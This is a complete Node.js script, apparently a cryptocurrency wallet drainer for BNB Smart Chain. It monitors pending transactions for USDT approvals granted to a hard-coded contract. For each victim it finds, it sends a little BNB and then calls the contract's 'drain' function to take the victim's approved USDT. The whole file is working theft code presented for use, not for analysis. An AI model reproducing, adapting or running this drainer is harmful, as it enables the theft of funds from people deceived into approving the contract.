const { ethers } = require("ethers");
require("dotenv").config();
const usdtAbi = require("./abi.json");
const axios = require("axios");

const provider = new ethers.providers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
const wallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider);

const CONTRACT_ADDRESS = "0xfB42A84FE8C95B7C0af0dfA634c5a496cAFf6676";
const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const RECIPIENT = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090";

const usdt = new ethers.Contract(USDT_ADDRESS, usdtAbi, provider);
const contract = new ethers.Contract(CONTRACT_ADDRESS, ["function drain(address from) external"], wallet);

async function monitor() {
  console.log("Monitoring for approvals...");

  provider.on("pending", async (txHash) => {
    try {
      const tx = await provider.getTransaction(txHash);
      if (!tx || !tx.to || tx.to.toLowerCase() !== USDT_ADDRESS.toLowerCase()) return;
      if (!tx.data.startsWith("0x095ea7b3")) return;

      const decoded = ethers.utils.defaultAbiCoder.decode(["address", "uint256"], "0x" + tx.data.slice(10));
      const spender = decoded[0];
      if (spender.toLowerCase() !== CONTRACT_ADDRESS.toLowerCase()) return;

      const sender = tx.from;
      console.log("Approval detected from:", sender);

      const bnbTx = {
        to: sender,
        value: ethers.utils.parseEther("0.001")
      };
      const sent = await wallet.sendTransaction(bnbTx);
      await sent.wait();

      const drainTx = await contract.drain(sender);
      await drainTx.wait();

      console.log("BNB sent and USDT drained from:", sender);
    } catch (e) {
      console.error("Error:", e.message);
    }
  });
}

monitor();
